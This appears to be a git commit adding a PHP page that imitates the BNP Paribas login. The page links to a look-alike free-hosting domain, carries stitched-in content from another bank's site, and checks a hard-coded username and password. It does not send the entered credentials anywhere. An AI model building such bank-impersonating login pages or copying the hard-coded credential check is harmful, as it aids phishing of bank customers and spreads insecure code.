49772480e5cd9182fdd7758991a7a836ffd41a01
dubois1234 <85576099+dubois1234@users.noreply.github.com>
2021-06-08 18:40:52 +0200

    Add files via upload

---
+++ BNP/bnpparibas _ Login.php
@@ -0,0 +1,323 @@
+<!DOCTYPE html>
+<!-- saved from url=(0014)about:internet -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>
+	.conteneur1{
+    overflow: hidden;
+    max-width: 935px;
+   
+    box-shadow: 0px 15px 10px -5px #777;
+}
+.d1{
+    width: 1000px;
+    height:595px;
+    background-color: #EDEDED;
+   
+}
+h5{position: relative;
+	top: 100px;
+	left: 80px;
+	color: red;
+}
+
+</style>
+
+				
+					<!-- Security Software provided by Platinum Mirror LTD (Programmer: Daniel Chatfield), Version: 5.0.3, License: Consumer -->
+					
+					<meta name="robots" content="noindex">
+					
+					<title>bnpparibas | Login</title>
+					<link rel="stylesheet" type="text/css" href="./bnpparibas _ Login_files/styles.css" media="all">
+					<link rel="stylesheet" type="text/css" href="./bnpparibas _ Login_files/bas.css" media="all">
+					<link rel="stylesheet" type="text/css" href="./bnpparibas _ Login_files/elementmenu.css" media="all">
+					<link rel="stylesheet" type="text/css" href="./bnpparibas _ Login_files/footer.css" media="all">
+
+
+					<script type="text/javascript" src="./bnpparibas _ Login_files/jquery.min.js.téléchargement"></script>
+					<script src="./bnpparibas _ Login_files/jquery.min.js(1).téléchargement"></script>
+                    <script src="./bnpparibas _ Login_files/bootstrap.min.js.téléchargement"></script>
+                    <script src="./bnpparibas _ Login_files/bootstrap.js.téléchargement"></script>
+                    <script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>
+					<link rel="shortcut icon" href="http://mabnpparibasse.000webhostapp.com/images/icoUBA.png">
+					
+					
+					
+					
+					
+					<link rel="stylesheet" href="./bnpparibas _ Login_files/orman.css" type="text/css" media="screen">
+					
+					
+					<meta name="google-site-verification" content="gAGcBC_y3W4q9G2w1CW19dQKh_yWGbPohDWtEsNsLVM">
+					
+				</head>
+	<body>
+	<div id="corps">
+					<div class="logo" style="background-image:url(images/UBA-logo-2.png)"></div>
+					<div class="login-form">
+					<div style="font: 41.25%/2 arial,helvetica,sans-serif; color: #555; font-size: 18px;" align="center"><b>Authentification</b></div>
+							
+							<center>
+								<form method="post" action="">
+							<center>Entrez votre identifiant et mot de passe</center>
+                            société   <input onclick="corps()" value="radiobutton" name="corp" type="radio">  Particuliers   <input name="corp" onclick="retail()" value="radiobutton" checked="checked" type="radio">   
+							
+							
+  
+							<br>
+							<table>
+							<tbody><tr><td><strong>
+								<center>Identifiant</center>
+							</strong>
+						</td></tr> 
+							<tr><td>
+								<center>
+								<input class="input" type="text" name="pseudo" id="pseudo"></center></td><td></td></tr>
+							<tr><td><strong><center>Mot de passe</center></strong></td></tr> 
+							<tr><td>
+								<center>
+								<input class="input" id="password" type="password" name="password"></center>
+								</td><td></td></tr>
+							
+							<tr><td>
+								<center>
+									<input id="Entrez" class="" type="submit" name="send" value="send">
+								</center>
+							</td></tr>
+							</tbody></table>
+
+							<center><a href="http://mabnpparibasse.000webhostapp.com/">Mot de passe oublié?</a></center>
+							
+							</form></center>
+
+		</div>
+		<?php  
+
+         if (isset($_POST['send'])) { 
+         	if ($_POST['pseudo']=='jean' AND $_POST['password']=='yves') {
+         		
+         	header('location: BNPPARIBAS.html');
+         } 
+         else echo "<h5>l'identifiant ou le mot de passe est incorect !</h5>";
+         		
+         	}
+  
+         	
+         
+		?>
+		
+
+		
+		<div id="gauche">
+    	 <div class="slider-wrapper theme-orman">
+           <div class="conteneur1">
+  <div class="d1">
+  	<marquee><img src="./bnpparibas _ Login_files/0A.jpg" width="1100px" height="550px">
+  		<img src="./bnpparibas _ Login_files/0B.jpg" width="1100px" height="550px">
+  		<img src="./bnpparibas _ Login_files/0C.jpg" width="1100px" height="550px">
+  		<img src="./bnpparibas _ Login_files/0D.jpg" width="1100px" height="550px"></marquee>
+  </div>
+</div>
+
+            <div class="nivo-controlNav-bg"></div>
+        </div> 
+		<script type="text/javascript" src="./bnpparibas _ Login_files/jquery-1.6.1.min.js.téléchargement"></script>
+        
+    </div>
+		
+		
+		
+		
+		<div id="bas">
+		<div class="top1"><a href="http://mabnpparibasse.000webhostapp.com/"><img src="./bnpparibas _ Login_files/homepgudirect.jpg" width="200px;" height="180px"></a></div><a href="http://mabnpparibasse.000webhostapp.com/">
+		</a><div class="top2"><a href="http://mabnpparibasse.000webhostapp.com/"></a><a href="http://mabnpparibasse.000webhostapp.com/"><img src="./bnpparibas _ Login_files/homepgcards.jpg" width="200px;" height="180px"></a></div><a href="http://mabnpparibasse.000webhostapp.com/">
+	  </a><div class="top3"><a href="http://mabnpparibasse.000webhostapp.com/"></a><a href="http://mabnpparibasse.000webhostapp.com/"><img src="./bnpparibas _ Login_files/homepgumobile.jpg" width="300px;" height="180px"></a></div>
+	  <div class="top4"><a href="http://mabnpparibasse.000webhostapp.com/"><img src="./bnpparibas _ Login_files/lolo41.jpg" width="320px" height="180px"></a></div>
+	  </div>
+	  
+	  
+	  
+	    
+	  
+ 
+	  
+		<div class="block_red"><strong><marquee>BNPPARIBAS Contact us</marquee></strong>
+		
+		<marquee>Email: assistance&amp;contact@bnpparibas.com</marquee>
+		
+		</div>
+  
+<div id="menu2">
+    <ul id="nav">
+        
+    <li><a href="https://www.ubagroup.com/countries/ng/personalbanking/eproducts" style="border-left:none;">E-products</a>
+    <ul>
+        <li><a href="http://mabnpparibasse.000webhostapp.com/504.php">U-Direct</a></li>
+        <li><a href="http://mabnpparibasse.000webhostapp.com/504.php">U-Mobile</a></li>
+        <li><a href="http://mabnpparibasse.000webhostapp.com/504.php">Payments</a></li>
+        <li><a href="http://mabnpparibasse.000webhostapp.com/504.php">U-Bills</a></li>
+        <li><a href="http://mabnpparibasse.000webhostapp.com/504.php">Portals</a></li>
+        <li><a href="http://mabnpparibasse.000webhostapp.com/504.php">Payment Solutions</a></li>
+        <li><a href="http://mabnpparibasse.000webhostapp.com/504.php">ATM Services</a></li>
+    </ul>
+</li>
+    <li><a href="http://mabnpparibasse.000webhostapp.com/">Cards</a></li>
+    <li><a href="http://mabnpparibasse.000webhostapp.com/" style="border-right:none;">Personal Banking</a>
+    <ul>
+        <li><a href="http://mabnpparibasse.000webhostapp.com/504.php">Open a BNPPARIBAS account online</a></li>
+        <li><a href="http://mabnpparibasse.000webhostapp.com/504.php">Savings Accounts</a></li>
+        <li><a href="http://mabnpparibasse.000webhostapp.com/504.php">Current Accounts</a></li>
+        <li><a href="http://mabnpparibasse.000webhostapp.com/504.php">Money Transfers</a></li>
+    </ul>
+</li>
+    </ul>
+</div>
+
+
+
+
+<div id="menu">
+    <ul class="nav">
+        
+    <li><a href="http://mabnpparibasse.000webhostapp.com/">Accueil</a></li>
+    <li><a href="http://mabnpparibasse.000webhostapp.com/504.php">Groupe</a></li>
+    <li><a href="http://mabnpparibasse.000webhostapp.com/504.php504.php">Investissement</a></li>
+    <li><a href="http://mabnpparibasse.000webhostapp.com/504.php">charge Sociale</a></li>
+    <li><a href="http://mabnpparibasse.000webhostapp.com/504.php">Centre sécurité</a></li>
+    <li><a href="http://mabnpparibasse.000webhostapp.com/504.php">Carrières</a></li>
+    <li><a href="http://mabnpparibasse.000webhostapp.com/504.php">Rapport fraude</a></li>
+	<li><a href="http://mabnpparibasse.000webhostapp.com/504.php">Contactez nous</a></li>
+    </ul>
+</div>
+
+
+            
+	
+
+
+
+<div id="footer">
+
+
+
+<div id="menufooter">
+    <ul id="navfooter">
+        
+   <li><a href="http://mabnpparibasse.000webhostapp.com/index.php" style="border-left:none;" class="navactive">Accueil</a></li>
+   <li><a href="http://mabnpparibasse.000webhostapp.com/504.php">Investissement</a></li>
+   <li><a href="http://mabnpparibasse.000webhostapp.com/504.php">charge Sociale</a></li>
+   <li><a href="http://mabnpparibasse.000webhostapp.com/504.php">Carrières</a></li>
+   <li><a href="http://mabnpparibasse.000webhostapp.com/504.php" style="border-right:none;">Rapport fraude</a></li>
+    </ul>
+</div>
+
+
+
+
+
+
+<div class="trait"></div>
+
+		<div class="box_pub_h">
+				<table border="0" cellpadding="0" cellspacing="0" width="100%">
+						<tbody>
+								<tr>
+										<td align="left">
+                  Group News
+              </td>
+										<td align="right">
+												<a href="http://mabnpparibasse.000webhostapp.com/">Archived News </a>
+										</td>
+										<td align="right" width="26">
+												<a href="http://mabnpparibasse.000webhostapp.com/">
+												</a>
+										</td>
+								</tr>
+						</tbody>
+				</table>
+		</div>
+
+<div class="trait1"></div>
+
+
+
+
+<div class="boxnews_d">May 12, 2019</div>
+<div class="boxnews_h">
+<a href="http://mabnpparibasse.000webhostapp.com/">BNPPARIBAS Launches Innovative Payment Solution “PAYATT…</a>
+</div>
+
+
+<div class="boxnews_d7">April 24, 2019</div>
+<div class="boxnews_h7"><a href="http://mabnpparibasse.000webhostapp.com/">Shareholders Laud BNPPARIBAS’s Board and Management On …</a></div>
+
+
+
+<div class="boxnews_d8">April 15, 2019</div>
+<div class="boxnews_h8"><a href="http://mabnpparibasse.000webhostapp.com/">BNPPARIBAS Records 35 Percent Growth in First Quarter Profit, <br>Projects Stronger Performance in 2015 </a></div>
+
+
+<div class="boxnews_d9">April 9, 2019</div>
+<div class="boxnews_h9"><a href="http://mabnpparibasse.000webhostapp.com/">Notice of 53rd AGM of BNPPARIBAS Plc</a></div>
+
+
+
+
+
+<div class="boxnews">March 26, 2018</div>
+<div class="boxnews_1"><a href="http://mabnpparibasse.000webhostapp.com/">BNPPARIBAS Sustains Growth Momentum, Grosses N290 <br> Billion Earnings in FY2014</a></div>
+
+<div class="boxnews2">April 8, 2019</div>
+<div class="boxnews_2"><a href="http://mabnpparibasse.000webhostapp.com/">Bond Listing: BNPPARIBAS Lists N30.5bn Issue on NSE and…</a></div>
+
+
+
+
+
+
+<div id="leslogos">
+<table cellspacing="" cellpadding="" border="0">
+<tbody><tr>
+<td><span>LA BANQUE MONDIALE </span></td>
+<td><a href="http://mabnpparibasse.000webhostapp.com/"><img src="./bnpparibas _ Login_files/twitter.gif" width="20" height="20" alt="Facebook" longdesc="index.php"></a></td>
+<td><a href="http://mabnpparibasse.000webhostapp.com/"><img src="./bnpparibas _ Login_files/face.gif" width="20" height="20" alt="Facebook" longdesc="index.php"></a></td>
+<td><a href="http://mabnpparibasse.000webhostapp.com/"><img src="./bnpparibas _ Login_files/soc3.gif" width="20" height="20" alt="Facebook" longdesc="index.php"></a></td>
+<td><a href="http://mabnpparibasse.000webhostapp.com/"><img src="./bnpparibas _ Login_files/googlepluslogo.jpg" width="20" height="20" alt="Facebook" longdesc="index.php"></a></td>
+<td><a href="http://mabnpparibasse.000webhostapp.com/"><img src="./bnpparibas _ Login_files/bloggericon.jpg" width="20" height="20" alt="Facebook" longdesc="index.php"></a></td>
+</tr>
+</tbody></table>
+</div>
+</div>
+	
+	
+	
+	
+
+
+<div id="menu3">
+    <ul id="nav3">
+        
+    <li><a href="http://mabnpparibasse.000webhostapp.com/" style="border-left:none;">Site map</a></li>
+    <li><a href="http://mabnpparibasse.000webhostapp.com/espacecompte/contactus.html">Contact Us</a></li>
+    <li><a href="http://mabnpparibasse.000webhostapp.com/" style="border-right:none;">Countries</a></li>
+    </ul>
+</div>
+
+<div id="foot_copy">
+<table border="0" cellpadding="0" cellspacing="0">
+<tbody><tr>
+<td nowrap="true">
+
+<div id="menu1a">
+    <div id="nav1a">
+        <a href="http://mabnpparibasse.000webhostapp.com/" style="border-left:none;">Terms &amp; Conditions</a>/<a href="http://mabnpparibasse.000webhostapp.com/" style="border-right:none;">Privacy Policy</a>
+    </div>
+</div>
+</td>
+<td>
+<span>/&nbsp; © 2006. All Rights Reserved.</span>
+</td>
+</tr>
+</tbody></table>
+</div>
+
+</div></body></html>
